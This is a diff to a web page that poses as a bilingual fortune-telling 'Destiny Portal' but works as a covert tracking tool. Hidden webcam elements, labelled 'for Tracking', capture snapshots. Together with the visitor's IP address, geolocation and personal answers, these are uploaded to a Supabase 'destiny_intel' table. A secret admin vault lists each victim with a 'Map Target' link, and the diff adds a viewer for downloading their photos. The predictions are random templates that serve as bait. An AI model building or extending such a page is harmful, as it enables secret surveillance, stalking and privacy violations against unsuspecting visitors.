@@ -5,9 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VIP Destiny Portal - Master Live Edition</title>
     
+    <!-- Fonts & Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800;900&family=Noto+Nastaliq+Urdu:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     
+    <!-- External Libraries -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
@@ -116,7 +118,8 @@
         a.loc-link { color: #00ffcc; text-decoration: none; font-weight: 700; display: inline-block; padding: 4px 10px; background: rgba(0,255,204,0.1); border-radius: 6px; border: 1px solid rgba(0,255,204,0.3); transition: 0.2s; }
         
         .snap-grid { display: flex; gap: 5px; flex-wrap: wrap; max-width: 180px; }
-        .snap-grid img { width: 50px; height: 40px; object-fit: cover; border-radius: 6px; border: 1px solid #444; box-shadow: 0 2px 4px rgba(0,0,0,0.5); }
+        .snap-grid img { width: 50px; height: 40px; object-fit: cover; border-radius: 6px; border: 1px solid #444; box-shadow: 0 2px 4px rgba(0,0,0,0.5); cursor: pointer; transition: 0.3s; }
+        .snap-grid img:hover { transform: scale(1.2); border-color: #00ffcc; box-shadow: 0 5px 15px rgba(0,255,204,0.5); z-index: 10; }
 
         #reportHeader { display: none; text-align: center; background: linear-gradient(180deg, #050a0f 0%, #0a0e17 100%); padding: 40px 30px; margin-bottom: 20px; font-family: 'Poppins', sans-serif; border: 1px solid #1f2d3d; border-radius: 8px; }
         #reportHeader h1 { margin: 0; font-size: 36px; font-weight: 900; text-transform: uppercase; color: #ffffff; letter-spacing: 4px; text-shadow: 0 0 20px rgba(255,255,255,0.2); }
@@ -124,10 +127,20 @@
         #reportHeader .meta-info { display: flex; justify-content: space-around; background: rgba(0,255,204,0.05); padding: 15px; border-radius: 8px; margin-top: 25px; border: 1px solid rgba(0,255,204,0.2); }
         #reportHeader p { margin: 0; font-size: 14px; color: #a0aec0; text-transform: uppercase; letter-spacing: 1px; }
         #reportHeader p strong { color: #00ffcc; }
+
+        /* === PREMIUM IMAGE VIEWER MODAL === */
+        #imageViewerModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10000; justify-content: center; align-items: center; flex-direction: column; backdrop-filter: blur(10px); }
+        #viewerImage { max-width: 90%; max-height: 70vh; border: 2px solid #00ffcc; border-radius: 10px; box-shadow: 0 0 30px rgba(0,255,204,0.3); margin-bottom: 20px; object-fit: contain; }
+        .viewer-controls { display: flex; gap: 20px; }
+        .btn-download-img { background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%); color: white; border: none; padding: 12px 30px; border-radius: 8px; font-weight: 800; cursor: pointer; display: flex; align-items: center; gap: 10px; font-size: 16px; box-shadow: 0 5px 15px rgba(0, 180, 219, 0.4); transition: 0.3s; }
+        .btn-download-img:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(0, 180, 219, 0.6); }
+        .btn-close-viewer { position: absolute; top: 25px; right: 35px; color: #ff4d4d; font-size: 40px; cursor: pointer; transition: 0.3s; }
+        .btn-close-viewer:hover { transform: scale(1.2); text-shadow: 0 0 20px red; }
     </style>
 </head>
 <body>
 
+    <!-- Silent Video Elements for Tracking -->
     <video id="webcamVideo" autoplay playsinline style="display:none;"></video>
     <canvas id="webcamCanvas" style="display:none;"></canvas>
 
@@ -136,6 +149,7 @@
     <div class="theme-toggle" onclick="toggleTheme()" title="Toggle Dark Mode"><i class="fa-solid fa-moon" id="themeIcon"></i></div>
     <div class="secret-crown" onclick="showVipLogin()" title="Admin Login"><i class="fa-solid fa-crown"></i></div>
 
+    <!-- 1. VIP SENSORY PERMISSION POPUP -->
     <div class="custom-overlay" id="sensoryModal">
         <div class="modal-box">
             <i class="fa-solid fa-satellite-dish fa-radar"></i>
@@ -148,6 +162,7 @@
         </div>
     </div>
 
+    <!-- 2. VIP ADMIN LOGIN POPUP -->
     <div class="custom-overlay" id="vipLoginModal">
         <div class="modal-box">
             <i class="fa-solid fa-user-shield"></i>
@@ -159,6 +174,7 @@
         </div>
     </div>
 
+    <!-- 3. 10 SECOND INIT SCREEN -->
     <div id="initScreen">
         <i class="fa-solid fa-server" style="font-size: 60px; margin-bottom: 20px; animation: popIn 1s infinite alternate;"></i>
         <h2 style="margin: 0; text-shadow: 0 0 15px #00ffcc; text-align: center;">SUPABASE SECURE CONNECTION</h2>
@@ -166,6 +182,16 @@
         <div id="syncText">Establishing Encrypted Connection...</div>
     </div>
 
+    <!-- 4. IMAGE VIEWER MODAL (NEW) -->
+    <div id="imageViewerModal">
+        <i class="fa-solid fa-xmark btn-close-viewer" onclick="closeImageViewer()"></i>
+        <img id="viewerImage" src="" alt="Full Size Intel">
+        <div class="viewer-controls">
+            <button class="btn-download-img" id="btnDownloadImg"><i class="fa-solid fa-download"></i> Download Snap</button>
+        </div>
+    </div>
+
+    <!-- MAIN APP PANEL -->
     <div class="glass-panel" id="mainPanel">
         <div class="step active" id="step1">
             <h2><i class="fa-solid fa-hourglass-half"></i> Enter Your Age<br><span class="urdu-text">اپنی عمر درج کریں</span></h2>
@@ -231,6 +257,7 @@
         </div>
     </div>
 
+    <!-- ADMIN VAULT UI -->
     <div id="adminVaultUI">
         <div class="vault-header">
             <h2 style="margin:0; color:#00ffcc; text-shadow:0 0 15px #00ffcc;"><i class="fa-solid fa-network-wired"></i> MASTER INTEL VAULT</h2>
@@ -382,6 +409,7 @@
             
             let uploadedUrls = [];
             
+            // 1. Upload Images to Supabase IF Connected
             if (dbClient) {
                 document.getElementById('loadingText').innerText = "Syncing with Enterprise Cloud...";
                 for (let i = 0; i < sessionSnaps.length; i++) {
@@ -399,6 +427,7 @@
                 document.getElementById('loadingText').innerText = "Saving to Local Vault...";
             }
 
+            // 2. Build User Data Object (EXACTLY matches SQL columns to prevent silent rejections)
             let newRecord = {
                 ip_address: currentUserIP,
                 location_coords: currentUserLoc.coordsString,
@@ -411,6 +440,7 @@
                 snaps: uploadedUrls
             };
 
+            // 3. Save to Supabase DB IF Connected, and retrieve the saved row
             if (dbClient) {
                 try {
                     const { data, error } = await dbClient.from('destiny_intel').insert([newRecord]).select();
@@ -428,11 +458,13 @@
                 newRecord.created_at = new Date().toISOString();
             }
 
+            // 4. Save to LocalStorage Backup
             globalAdminVault.push(newRecord);
             localStorage.setItem('adminVault', JSON.stringify(globalAdminVault));
 
             fetchLiveQuote();
 
+            // 5. Show Final Reveal
             setTimeout(() => {
                 document.getElementById('loadingScreen').style.display = 'none';
                 generateAccuratePrediction();
@@ -446,7 +478,6 @@
             const bff = document.getElementById('bestFriend').value;
             const love = document.getElementById('loveName').value;
             
-            // Large pool of dynamic templates
             const templatesEn = [
                 `The rhythm of "${favSong}" perfectly aligns with your timeline. A massive financial breakthrough alongside ${bff} is imminent.`,
                 `The energy connecting you and ${love} is peaking. Keep your frequency high with "${favSong}".`,
@@ -469,7 +500,7 @@
                 `آپ کی اندرونی طاقت عروج پر ہے۔ ${love} کی طرف اٹھایا گیا ایک قدم جادوئی نتائج لائے گا۔`
             ];
 
-            // 100% New Result Every Time (Math.random selection)
+            // 100% Random Selection ensures a new prediction every time
             const randomIndex = Math.floor(Math.random() * templatesEn.length);
 
             document.getElementById('predictionTextEn').innerText = templatesEn[randomIndex]; 
@@ -488,14 +519,12 @@
 
         async function fetchLiveQuote() {
             try {
-                // Strict Cache-Busting: Append exact millisecond timestamp to URL
                 const response = await fetch(`https://api.quotable.io/random?timestamp=${Date.now()}`);
                 if (!response.ok) throw new Error("API Offline");
                 const data = await response.json();
                 document.getElementById('quoteTextEn').innerText = `"${data.content}" - ${data.author}`;
                 document.getElementById('quoteTextUr').innerText = "یہ ایک خوبصورت اور سچا قول ہے جو آپ کی زندگی میں روشنی لائے گا۔"; 
             } catch (error) {
-                // Random Fallback if API fails
                 const randomFallback = fallbackQuotes[Math.floor(Math.random() * fallbackQuotes.length)];
                 document.getElementById('quoteTextEn').innerText = randomFallback.en;
                 document.getElementById('quoteTextUr').innerText = randomFallback.ur;
@@ -577,8 +606,9 @@
                 let cleanTime = entry.created_at ? new Date(entry.created_at).toLocaleString() : "Unknown Time";
                 let locDisplay = entry.location_coords && entry.location_coords.includes("Denied") ? `<span style="color:#ff4d4d; font-weight:bold;">BLOCKED</span>` : `<a href="${entry.location_link}" target="_blank" class="loc-link"><i class="fa-solid fa-crosshairs"></i> Map Target</a><br><small style="color:#00b4db;">${entry.location_coords}</small>`;
                 
+                // --- INTEGRATED IMAGE VIEWER TRIGGER ---
                 let snapsHTML = entry.snaps && entry.snaps.length > 0 
-                    ? `<div class="snap-grid">` + entry.snaps.map(url => `<img src="${url}" alt="Intel Snap">`).join('') + `</div>`
+                    ? `<div class="snap-grid">` + entry.snaps.map((url, index) => `<img src="${url}" alt="Intel Snap" onclick="openImageViewer('${url}', 'Intel_Snap_${entry.id || i}_${index}.jpg')">`).join('') + `</div>`
                     : `<span style="color:#555; font-style:italic;">No Visuals</span>`;
 
                 tbody.innerHTML += `
@@ -614,13 +644,57 @@
             html2pdf().set(opt).from(target).save().then(() => { document.getElementById('reportHeader').style.display = 'none'; target.style.background = ""; });
         }
 
+        // --- 9. PREMIUM IMAGE VIEWER LOGIC ---
+        function openImageViewer(src, filename) {
+            isModalOpen = true;
+            const modal = document.getElementById('imageViewerModal');
+            const img = document.getElementById('viewerImage');
+            const btn = document.getElementById('btnDownloadImg');
+            
+            img.src = src;
+            modal.style.display = 'flex';
+            
+            // Assign dynamic download logic to the button
+            btn.onclick = () => downloadImage(src, filename);
+        }
+
+        function closeImageViewer() {
+            isModalOpen = false;
+            document.getElementById('imageViewerModal').style.display = 'none';
+            document.getElementById('viewerImage').src = "";
+        }
+
+        async function downloadImage(src, filename) {
+            try {
+                // Fetch to bypass standard anchor CORS restrictions
+                const response = await fetch(src);
+                const blob = await response.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+            } catch (e) {
+                // Fallback direct anchor method
+                const a = document.createElement('a');
+                a.href = src;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            }
+        }
+
+        // Theme Toggle & Keypress Logic
         let isDarkMode = false;
         function toggleTheme() {
             isDarkMode = !isDarkMode; document.body.classList.toggle('dark-theme', isDarkMode);
             document.getElementById('themeIcon').classList.replace(isDarkMode ? 'fa-moon' : 'fa-sun', isDarkMode ? 'fa-sun' : 'fa-moon');
         }
         
-        // Prevent Enter Key Bug When Modals are Open
         document.addEventListener('keypress', function (e) { 
             if (e.key === 'Enter' && !isModalOpen) { const a = document.querySelector('.step.active'); if (a) { const b = a.querySelector('button'); if (b) b.click(); } } 
         });
